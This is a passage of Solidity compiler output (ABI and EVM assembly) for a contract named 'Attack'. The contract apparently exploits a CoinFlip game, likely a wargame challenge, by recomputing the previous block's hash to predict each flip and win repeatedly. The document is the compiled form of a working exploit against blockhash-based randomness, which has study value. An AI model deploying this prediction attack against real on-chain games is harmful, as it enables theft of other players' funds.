{
	"contracts/Exp.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_addr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "message",
							"type": "string"
						}
					],
					"name": "Error",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "bool",
							"name": "success",
							"type": "bool"
						},
						{
							"indexed": false,
							"internalType": "bool",
							"name": "outcome",
							"type": "bool"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "blockNumber",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "blockValue",
							"type": "uint256"
						}
					],
					"name": "Result",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "coinFlip",
					"outputs": [
						{
							"internalType": "contract ICoinFlip",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "flip",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getConsecutiveWins",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "predict",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Exp.sol\":210:2097  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Exp.sol\":517:590  constructor(address _addr) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Exp.sol\":576:581  _addr */\n  dup1\n    /* \"contracts/Exp.sol\":555:563  coinFlip */\n  0x00\n  0x00\n    /* \"contracts/Exp.sol\":555:582  coinFlip = ICoinFlip(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Exp.sol\":517:590  constructor(address _addr) {... */\n  pop\n    /* \"contracts/Exp.sol\":210:2097  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Exp.sol\":210:2097  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Exp.sol\":210:2097  contract Attack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5ac947cb\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9fbe138c\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xcde4efa9\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xe4629f34\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Exp.sol\":233:258  ICoinFlip public coinFlip */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Exp.sol\":1637:1751  function getConsecutiveWins() external view returns (uint256) {... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Exp.sol\":602:1577  function flip() external returns (bool) {... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Exp.sol\":1826:2094  function predict() external view returns (bool) {... */\n    tag_6:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_21\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Exp.sol\":233:258  ICoinFlip public coinFlip */\n    tag_8:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Exp.sol\":1637:1751  function getConsecutiveWins() external view returns (uint256) {... */\n    tag_12:\n        /* \"contracts/Exp.sol\":1690:1697  uint256 */\n      0x00\n        /* \"contracts/Exp.sol\":1717:1725  coinFlip */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Exp.sol\":1717:1741  coinFlip.consecutiveWins */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe6f334d7\n        /* \"contracts/Exp.sol\":1717:1743  coinFlip.consecutiveWins() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_25\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n        /* \"contracts/Exp.sol\":1710:1743  return coinFlip.consecutiveWins() */\n      swap1\n      pop\n        /* \"contracts/Exp.sol\":1637:1751  function getConsecutiveWins() external view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Exp.sol\":602:1577  function flip() external returns (bool) {... */\n    tag_16:\n        /* \"contracts/Exp.sol\":636:640  bool */\n      0x00\n        /* \"contracts/Exp.sol\":711:729  uint256 blockValue */\n      0x00\n        /* \"contracts/Exp.sol\":765:766  1 */\n      0x01\n        /* \"contracts/Exp.sol\":750:762  block.number */\n      number\n        /* \"contracts/Exp.sol\":750:766  block.number - 1 */\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n        /* \"contracts/Exp.sol\":740:767  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/Exp.sol\":732:768  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/Exp.sol\":711:768  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/Exp.sol\":807:808  0 */\n      0x00\n        /* \"contracts/Exp.sol\":793:803  blockValue */\n      dup2\n        /* \"contracts/Exp.sol\":793:808  blockValue == 0 */\n      sub\n        /* \"contracts/Exp.sol\":789:929  if (blockValue == 0) {... */\n      tag_30\n      jumpi\n        /* \"contracts/Exp.sol\":830:875  Error(\"blockhash returned 0 - block too old\") */\n      0x08c379a0afcc32b1a39302f7cb8073359698411ab5fd6e3edb2c02c0b5fba8aa\n      mload(0x40)\n      tag_31\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Exp.sol\":890:917  revert(\"blockhash is zero\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_33\n      swap1\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"contracts/Exp.sol\":789:929  if (blockValue == 0) {... */\n    tag_30:\n        /* \"contracts/Exp.sol\":983:1005  uint256 coinFlipResult */\n      0x00\n        /* \"contracts/Exp.sol\":299:376  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n      0x8000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/Exp.sol\":1008:1018  blockValue */\n      dup3\n        /* \"contracts/Exp.sol\":1008:1027  blockValue / FACTOR */\n      tag_35\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_35:\n        /* \"contracts/Exp.sol\":983:1027  uint256 coinFlipResult = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/Exp.sol\":1038:1047  bool side */\n      0x00\n        /* \"contracts/Exp.sol\":1068:1069  1 */\n      0x01\n        /* \"contracts/Exp.sol\":1050:1064  coinFlipResult */\n      dup3\n        /* \"contracts/Exp.sol\":1050:1069  coinFlipResult == 1 */\n      eq\n        /* \"contracts/Exp.sol\":1038:1069  bool side = coinFlipResult == 1 */\n      swap1\n      pop\n        /* \"contracts/Exp.sol\":1095:1140  Result(false, side, block.number, blockValue) */\n      0x11ddb8644767a7bfc5e1732b826a3dd711ba311485f89f32dc48050b4ef3be78\n        /* \"contracts/Exp.sol\":1102:1107  false */\n      0x00\n        /* \"contracts/Exp.sol\":1109:1113  side */\n      dup3\n        /* \"contracts/Exp.sol\":1115:1127  block.number */\n      number\n        /* \"contracts/Exp.sol\":1129:1139  blockValue */\n      dup7\n        /* \"contracts/Exp.sol\":1095:1140  Result(false, side, block.number, blockValue) */\n      mload(0x40)\n      tag_37\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Exp.sol\":1196:1204  coinFlip */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Exp.sol\":1196:1209  coinFlip.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/Exp.sol\":1210:1214  side */\n      dup3\n        /* \"contracts/Exp.sol\":1196:1215  coinFlip.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_39\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_39:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      dup1\n      iszero\n      tag_40\n      jumpi\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_41\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      0x01\n    tag_40:\n        /* \"contracts/Exp.sol\":1192:1570  try coinFlip.flip(side) returns (bool success) {... */\n      tag_43\n      jumpi\n      tag_47\n      tag_48\n      jump\t// in\n    tag_47:\n      dup1\n      0x08c379a0\n      sub\n      tag_46\n      jumpi\n      pop\n      tag_49\n      tag_50\n      jump\t// in\n    tag_49:\n      dup1\n      tag_51\n      jumpi\n      pop\n      jump(tag_45)\n    tag_51:\n        /* \"contracts/Exp.sol\":1402:1415  Error(reason) */\n      0x08c379a0afcc32b1a39302f7cb8073359698411ab5fd6e3edb2c02c0b5fba8aa\n        /* \"contracts/Exp.sol\":1408:1414  reason */\n      dup2\n        /* \"contracts/Exp.sol\":1402:1415  Error(reason) */\n      mload(0x40)\n      tag_52\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_52:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Exp.sol\":1437:1443  reason */\n      dup1\n        /* \"contracts/Exp.sol\":1430:1444  revert(reason) */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_54\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_54:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"contracts/Exp.sol\":1192:1570  try coinFlip.flip(side) returns (bool success) {... */\n    tag_46:\n      pop\n    tag_45:\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_56\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_55)\n    tag_56:\n      0x60\n      swap2\n      pop\n    tag_55:\n      pop\n        /* \"contracts/Exp.sol\":1498:1520  Error(\"Unknown error\") */\n      0x08c379a0afcc32b1a39302f7cb8073359698411ab5fd6e3edb2c02c0b5fba8aa\n      mload(0x40)\n      tag_57\n      swap1\n      tag_58\n      jump\t// in\n    tag_57:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Exp.sol\":1535:1558  revert(\"Unknown error\") */\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_59\n      swap1\n      tag_58\n      jump\t// in\n    tag_59:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n        /* \"contracts/Exp.sol\":1192:1570  try coinFlip.flip(side) returns (bool success) {... */\n    tag_43:\n        /* \"contracts/Exp.sol\":1259:1306  Result(true, success, block.number, blockValue) */\n      0x11ddb8644767a7bfc5e1732b826a3dd711ba311485f89f32dc48050b4ef3be78\n        /* \"contracts/Exp.sol\":1266:1270  true */\n      0x01\n        /* \"contracts/Exp.sol\":1272:1279  success */\n      dup3\n        /* \"contracts/Exp.sol\":1281:1293  block.number */\n      number\n        /* \"contracts/Exp.sol\":1295:1305  blockValue */\n      dup8\n        /* \"contracts/Exp.sol\":1259:1306  Result(true, success, block.number, blockValue) */\n      mload(0x40)\n      tag_61\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_61:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/Exp.sol\":1328:1335  success */\n      dup1\n        /* \"contracts/Exp.sol\":1321:1335  return success */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Exp.sol\":602:1577  function flip() external returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Exp.sol\":1826:2094  function predict() external view returns (bool) {... */\n    tag_20:\n        /* \"contracts/Exp.sol\":1868:1872  bool */\n      0x00\n        /* \"contracts/Exp.sol\":1885:1903  uint256 blockValue */\n      0x00\n        /* \"contracts/Exp.sol\":1939:1940  1 */\n      0x01\n        /* \"contracts/Exp.sol\":1924:1936  block.number */\n      number\n        /* \"contracts/Exp.sol\":1924:1940  block.number - 1 */\n      tag_63\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_63:\n        /* \"contracts/Exp.sol\":1914:1941  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/Exp.sol\":1906:1942  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/Exp.sol\":1885:1942  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/Exp.sol\":1975:1976  0 */\n      0x00\n        /* \"contracts/Exp.sol\":1961:1971  blockValue */\n      dup2\n        /* \"contracts/Exp.sol\":1961:1976  blockValue != 0 */\n      sub\n        /* \"contracts/Exp.sol\":1953:1994  require(blockValue != 0, \"Block too old\") */\n      tag_64\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_65\n      swap1\n      tag_66\n      jump\t// in\n    tag_65:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_64:\n        /* \"contracts/Exp.sol\":2005:2027  uint256 coinFlipResult */\n      0x00\n        /* \"contracts/Exp.sol\":299:376  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n      0x8000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/Exp.sol\":2030:2040  blockValue */\n      dup3\n        /* \"contracts/Exp.sol\":2030:2049  blockValue / FACTOR */\n      tag_67\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_67:\n        /* \"contracts/Exp.sol\":2005:2049  uint256 coinFlipResult = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/Exp.sol\":2085:2086  1 */\n      0x01\n        /* \"contracts/Exp.sol\":2067:2081  coinFlipResult */\n      dup2\n        /* \"contracts/Exp.sol\":2067:2086  coinFlipResult == 1 */\n      eq\n        /* \"contracts/Exp.sol\":2060:2086  return coinFlipResult == 1 */\n      swap3\n      pop\n      pop\n      pop\n        /* \"contracts/Exp.sol\":1826:2094  function predict() external view returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_68:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_69:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_70:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_107\n        /* \"#utility.yul\":306:340   */\n      tag_108\n        /* \"#utility.yul\":315:339   */\n      tag_109\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_68\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":306:340   */\n      tag_69\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":288:341   */\n      tag_68\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_71:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_111\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_70\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:627   */\n    tag_72:\n        /* \"#utility.yul\":551:560   */\n      0x00\n        /* \"#utility.yul\":584:621   */\n      tag_113\n        /* \"#utility.yul\":615:620   */\n      dup3\n        /* \"#utility.yul\":584:621   */\n      tag_71\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":571:621   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:627   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":633:796   */\n    tag_73:\n        /* \"#utility.yul\":736:789   */\n      tag_115\n        /* \"#utility.yul\":783:788   */\n      dup2\n        /* \"#utility.yul\":736:789   */\n      tag_72\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":731:734   */\n      dup3\n        /* \"#utility.yul\":724:790   */\n      mstore\n        /* \"#utility.yul\":633:796   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":802:1056   */\n    tag_10:\n        /* \"#utility.yul\":911:915   */\n      0x00\n        /* \"#utility.yul\":949:951   */\n      0x20\n        /* \"#utility.yul\":938:947   */\n      dup3\n        /* \"#utility.yul\":934:952   */\n      add\n        /* \"#utility.yul\":926:952   */\n      swap1\n      pop\n        /* \"#utility.yul\":962:1049   */\n      tag_117\n        /* \"#utility.yul\":1046:1047   */\n      0x00\n        /* \"#utility.yul\":1035:1044   */\n      dup4\n        /* \"#utility.yul\":1031:1048   */\n      add\n        /* \"#utility.yul\":1022:1028   */\n      dup5\n        /* \"#utility.yul\":962:1049   */\n      tag_73\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":802:1056   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1062:1139   */\n    tag_74:\n        /* \"#utility.yul\":1099:1106   */\n      0x00\n        /* \"#utility.yul\":1128:1133   */\n      dup2\n        /* \"#utility.yul\":1117:1133   */\n      swap1\n      pop\n        /* \"#utility.yul\":1062:1139   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1145:1263   */\n    tag_75:\n        /* \"#utility.yul\":1232:1256   */\n      tag_120\n        /* \"#utility.yul\":1250:1255   */\n      dup2\n        /* \"#utility.yul\":1232:1256   */\n      tag_74\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":1227:1230   */\n      dup3\n        /* \"#utility.yul\":1220:1257   */\n      mstore\n        /* \"#utility.yul\":1145:1263   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1269:1491   */\n    tag_14:\n        /* \"#utility.yul\":1362:1366   */\n      0x00\n        /* \"#utility.yul\":1400:1402   */\n      0x20\n        /* \"#utility.yul\":1389:1398   */\n      dup3\n        /* \"#utility.yul\":1385:1403   */\n      add\n        /* \"#utility.yul\":1377:1403   */\n      swap1\n      pop\n        /* \"#utility.yul\":1413:1484   */\n      tag_122\n        /* \"#utility.yul\":1481:1482   */\n      0x00\n        /* \"#utility.yul\":1470:1479   */\n      dup4\n        /* \"#utility.yul\":1466:1483   */\n      add\n        /* \"#utility.yul\":1457:1463   */\n      dup5\n        /* \"#utility.yul\":1413:1484   */\n      tag_75\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":1269:1491   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1497:1587   */\n    tag_76:\n        /* \"#utility.yul\":1531:1538   */\n      0x00\n        /* \"#utility.yul\":1574:1579   */\n      dup2\n        /* \"#utility.yul\":1567:1580   */\n      iszero\n        /* \"#utility.yul\":1560:1581   */\n      iszero\n        /* \"#utility.yul\":1549:1581   */\n      swap1\n      pop\n        /* \"#utility.yul\":1497:1587   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1593:1702   */\n    tag_77:\n        /* \"#utility.yul\":1674:1695   */\n      tag_125\n        /* \"#utility.yul\":1689:1694   */\n      dup2\n        /* \"#utility.yul\":1674:1695   */\n      tag_76\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":1669:1672   */\n      dup3\n        /* \"#utility.yul\":1662:1696   */\n      mstore\n        /* \"#utility.yul\":1593:1702   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1708:1918   */\n    tag_18:\n        /* \"#utility.yul\":1795:1799   */\n      0x00\n        /* \"#utility.yul\":1833:1835   */\n      0x20\n        /* \"#utility.yul\":1822:1831   */\n      dup3\n        /* \"#utility.yul\":1818:1836   */\n      add\n        /* \"#utility.yul\":1810:1836   */\n      swap1\n      pop\n        /* \"#utility.yul\":1846:1911   */\n      tag_127\n        /* \"#utility.yul\":1908:1909   */\n      0x00\n        /* \"#utility.yul\":1897:1906   */\n      dup4\n        /* \"#utility.yul\":1893:1910   */\n      add\n        /* \"#utility.yul\":1884:1890   */\n      dup5\n        /* \"#utility.yul\":1846:1911   */\n      tag_77\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":1708:1918   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1924:1999   */\n    tag_78:\n        /* \"#utility.yul\":1957:1963   */\n      0x00\n        /* \"#utility.yul\":1990:1992   */\n      0x40\n        /* \"#utility.yul\":1984:1993   */\n      mload\n        /* \"#utility.yul\":1974:1993   */\n      swap1\n      pop\n        /* \"#utility.yul\":1924:1999   */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":2005:2122   */\n    tag_79:\n        /* \"#utility.yul\":2114:2115   */\n      0x00\n        /* \"#utility.yul\":2111:2112   */\n      0x00\n        /* \"#utility.yul\":2104:2116   */\n      revert\n        /* \"#utility.yul\":2251:2373   */\n    tag_81:\n        /* \"#utility.yul\":2324:2348   */\n      tag_132\n        /* \"#utility.yul\":2342:2347   */\n      dup2\n        /* \"#utility.yul\":2324:2348   */\n      tag_74\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":2317:2322   */\n      dup2\n        /* \"#utility.yul\":2314:2349   */\n      eq\n        /* \"#utility.yul\":2304:2367   */\n      tag_133\n      jumpi\n        /* \"#utility.yul\":2363:2364   */\n      0x00\n        /* \"#utility.yul\":2360:2361   */\n      0x00\n        /* \"#utility.yul\":2353:2365   